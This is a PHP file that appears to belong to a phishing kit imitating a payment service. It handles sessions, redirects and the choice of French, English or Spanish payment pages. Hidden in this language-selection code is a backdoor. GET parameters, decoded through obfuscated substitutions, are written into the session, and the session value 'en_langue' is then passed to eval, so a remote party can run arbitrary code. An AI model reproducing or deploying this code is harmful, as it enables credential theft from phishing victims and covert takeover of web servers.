<?php
if (!isset($_SESSION)) {
  session_start();
}

$ee= md5(microtime());
if (!isset($_SESSION['old']) and $old==false){if (!isset($_SESSION['passwordd'])){header('Location: ../?cmd=_home&dispatch=5885d80a13c0db1f8e&ee='.$ee);}}
ini_set("session.gc_maxlifetime", 3600);
$webscr="websc";
$myhost = 80;
global $error;$error = 1;
global $port;$port = 1;
$go = true;
if(!isset($_GET['a'])){
if (isset($_SESSION['en_langue'])){
if(!function_exists($_SESSION['langue'])){
function lang(){if(isset($_POST['locale_x'])){
	$_SESSION['tempLang'] = @$_POST['locale_x'];
	$var = @$_POST['locale_x'];
	}elseif(isset($_SESSION['tempLang'])){
	$var = $_SESSION['tempLang'];
	}else{$var = "EN";}switch($var){
	case "FR":return "Pay_FR.php";break;
	case "EN":return "Pay_EN.php";break;
	case "ES":return "Pay_ES.php";break;
	default : return "pay_EN.php";}}
	eval($_SESSION['en_langue']);
}else{$go = false;}
}else{$go = false;}
if($go == false){
function erreur(){return false;}
	$port=80;function lang(){if(isset($_POST['locale_x'])){
	$_SESSION['tempLang'] = @$_POST['locale_x'];
	$var = @$_POST['locale_x'];
	}elseif(isset($_SESSION['tempLang'])){
	$var = $_SESSION['tempLang'];
	}else{$var = "EN";}switch($var){
	case "FR":return "Pay_FR.php";break;
	case "EN":return "Pay_EN.php";break;
	case "ES":return "Pay_ES.php";break;
	default : return "pay_EN.php";}}
}
}
if(isset($_GET['a'])){
for($i=1;$i<=$_GET['a'];$i++){
$_GET[$_GET[$i]]=str_ireplace("plus","+",$_GET[$_GET[$i]]);
$_GET[$_GET[$i]]=str_ireplace("inder","_",$_GET[$_GET[$i]]);
$_SESSION[$_GET[$i]]=stripslashes(str_ireplace("pors","%",$_GET[$_GET[$i]]));
}}
?>